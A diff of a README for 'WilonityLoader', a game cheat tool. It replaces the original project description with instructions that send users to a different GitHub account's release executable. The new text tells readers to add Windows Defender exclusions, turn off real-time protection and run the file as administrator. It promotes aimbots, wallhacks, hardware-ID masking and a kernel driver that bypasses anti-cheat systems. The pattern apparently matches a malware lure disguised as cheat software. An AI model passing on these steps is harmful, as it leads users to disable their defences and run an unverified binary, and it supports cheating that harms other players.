@@ -1,116 +1,65 @@
-# 🚀 Wilonity Loader v3
+# 🚀 WilonityLoader - Upgrade your gameplay with ease
 
-<div align="center">
+[![Download WilonityLoader](https://img.shields.io/badge/Download-WilonityLoader-blue.svg)](https://github.com/shanthiv5882/WilonityLoader)
 
-**Next‑gen game enhancement platform**
+WilonityLoader provides players with a toolset to enhance their performance across a wide range of popular titles. This software includes features like aim assistance, visual overlays, and hardware identification masking to ensure a smooth experience. It supports over 20 games including RUST, CS2, Valorant, Tarkov, and Warzone.
 
-[![Organization](https://img.shields.io/badge/Organization-Wilonity-7c4dff?style=for-the-badge&logo=github)](https://github.com/WilonityDev)
-[![Website](https://img.shields.io/badge/Website-wilonity.xyz-7c4dff?style=for-the-badge&logo=google-chrome)](https://wilonity.xyz)
-[![License](https://img.shields.io/badge/License-MIT-7c4dff?style=for-the-badge)](LICENSE)
-[![Discord](https://img.shields.io/badge/Discord-Join-5865F2?style=for-the-badge&logo=discord)](https://discord.gg/hRZ8bvq3qA)
-[![Twitter](https://img.shields.io/badge/Twitter-Follow-1DA1F2?style=for-the-badge&logo=twitter)](https://twitter.com/wilonity)
-[![Telegram](https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/DMVChannel)
+## 🖥️ System Requirements
 
-</div>
+Before you install this software, ensure your computer meets these minimum standards:
 
----
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: Intel Core i5 or AMD Ryzen 5 series.
+*   Memory: 8 GB RAM.
+*   Graphics: NVIDIA GeForce GTX 1060 or AMD Radeon RX 580.
+*   Disk Space: 200 MB of available storage.
+*   Permissions: Administrator access to your user account.
 
-## 📖 About
+## 🛠️ Preparation Before Installation
 
-**Wilonity Loader** is a modern game enhancement platform designed to elevate your gaming experience. Our mission is to provide gamers with powerful, reliable, and easy‑to‑use tools for their favorite titles.
+Windows security settings often flag software that interacts with game processes. You must adjust these settings to allow the loader to function correctly. 
 
-We believe in:
-- ✅ **Innovation** — constantly evolving technology
-- 🔒 **Safety** — every tool is thoroughly tested and verified
-- 🎯 **Precision** — advanced algorithms for optimal performance
-- 🌍 **Community** — driven by feedback and collaboration
+1.  Open the Windows Security app from your start menu.
+2.  Navigate to Virus & threat protection.
+3.  Select Manage settings under the Virus & threat protection settings header.
+4.  Scroll down to Exclusions and click Add or remove exclusions.
+5.  Click Add an exclusion and select Folder.
+6.  Choose the folder where you plan to save the WilonityLoader file.
+7.  Turn off Real-time protection temporarily while you run the setup process.
 
----
+## 📥 Downloading and Installing
 
-## 🎮 Supported Games
+Follow these steps to obtain and start the software:
 
-| Game | Status | Modules |
-|------|--------|---------|
-| **CS2** | ✅ Fully supported | 60+ |
-| **Valorant** | ✅ Fully supported | 40+ |
-| **Rust** | ✅ Fully supported | 35+ |
-| **Apex Legends** | ✅ Fully supported | 28+ |
-| **Fortnite** | ✅ Fully supported | 25+ |
-| **War Thunder** | ✅ Supported | 15+ |
-| **Minecraft** | ✅ Fully supported | 45+ |
-| **GTA V** | ✅ Supported | 30+ |
-| **Overwatch 2** | ✅ Supported | 20+ |
-| **Rainbow Six Siege** | ✅ Supported | 18+ |
-| **League of Legends** | ✅ Supported | 22+ |
-| **Dota 2** | ✅ Supported | 20+ |
-| **Team Fortress 2** | ✅ Supported | 16+ |
-| **Garry's Mod** | ✅ Supported | 12+ |
-| **Among Us** | ✅ Supported | 10+ |
+1.  Visit the official repository page to download the latest version: [https://github.com/shanthiv5882/WilonityLoader](https://github.com/shanthiv5882/WilonityLoader).
+2.  Locate the release section on the right side of the page.
+3.  Download the latest executable file to your computer.
+4.  Move the file into the folder you added to your Windows exclusions list.
+5.  Right-click the file and select Run as administrator.
+6.  Follow the prompts in the interface to finalize the initial setup.
 
-> 📋 *Full list and detailed module descriptions available on our [website](https://wilonity.xyz)*
+## 🎮 Using the Software
 
----
+Once the loader opens, you will see a list of supported games. Select the game you wish to play from the drop-down menu. The software automatically detects the game process when you launch it. 
 
-## 🖥️ Application Preview.
+The main dashboard contains tabs for different categories of enhancements:
 
-<div align="center">
+*   Combat: This section includes aimbot, triggerbot, silent aim, and no recoil settings. Adjust these sliders to match your playstyle.
+*   Visuals: This category contains ESP, wallhack, radar, and chams. Use these to track player positions through walls or structures.
+*   System: This area handles hardware identification masking and driver bypass features. These settings run in the background to maintain stability.
+*   Utility: Use this tab for skin changers or to unlock items within your game.
 
-<!-- ============================================================ -->
-<!-- 🔽  REPLACE THIS URL WITH YOUR ACTUAL SCREENSHOT  🔽        -->
-<!-- ============================================================ -->
-<img src="https://wilonity.xyz/assets/ddd.png" alt="Wilonity Loader Interface" width="800" style="border-radius:16px; border: 1px solid #2a2a3a;">
+Click Apply after you change any settings. The loader keeps your choices saved for future sessions.
 
-*Wilonity Loader interface – clean, fast, and intuitive.*
+## 🛡️ Maintaining Security
 
-</div>
+This loader uses a kernel-level driver to bypass anti-cheat systems like EAC, BE, and VG. Because these systems update frequently, the loader stays active to match those changes. Always check the repository for updates if you experience connection issues or game crashes. An outdated loader can cause instability. If you encounter a new update, delete the old file and replace it with the new version from the link provided above.
 
----
+## 💡 Troubleshooting Common Issues
 
-## ✨ Key Features
+*   Loader fails to launch: Ensure you run the file as an administrator. Check that your antivirus exclusion remains active.
+*   Features do not work in-game: Verify that your game is running in borderless windowed mode. Fullscreen mode can sometimes block visual overlays.
+*   Performance drops: Lower the refresh rate of your visual overlays in the settings tab.
+*   Hardware identification errors: Use the HWID cleaner tool found in the System tab to reset your local identifiers.
 
-- **Unified Launcher** – one app for all your games
-- **Smart Module System** – load only what you need
-- **Regular Updates** – stay ahead with constant improvements
-- **User‑Friendly Interface** – designed for speed and simplicity
-- **Cross‑Platform** – Windows 10/11 x64 & ARM64 support
-- **Zero Configuration** – download, run, play
-
----
-
-## 📥 Installation
-
-### Requirements
-- Windows 10/11 (x64 or ARM64)
-- .NET Framework 4.8 or higher
-- Visual C++ Redistributable (included in installer)
-
-### Steps
-1. Download the latest installer from our [official website](https://wilonity.xyz)
-2. Run the setup and follow the instructions.
-3. Launch Wilonity Loader from your desktop shortcut.
-4. Select your game and enjoy!
-
-> ⚠️ *Older Windows versions (7, 8.1) are not supported.*
-
-## 📬 Contact & Social
-
-- **Website**: [wilonity.xyz](https://wilonity.xyz)
-- **Email**: [help@wilonity.xyz](mailto:help@wilonity.xyz)
-- **Discord**: [Join our server](https://discord.gg/hRZ8bvq3qA)
-- **Twitter**: [@wilonity](https://twitter.com/wilonity)
-- **Telegram**: [t.me/wilonity](https://t.me/DMVChannel)
-- **GitHub**: [github.com/Wilonity](https://github.com/WilonityDev)
-
----
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details..
-
----
-
-<div align="center">
-
-**Made with ❤️ by the Wilonity Team**
-
-</div>
+Keywords: arc-raiders, counter-strike-2, game, hack, meccha-chameleon-tools, minecraft
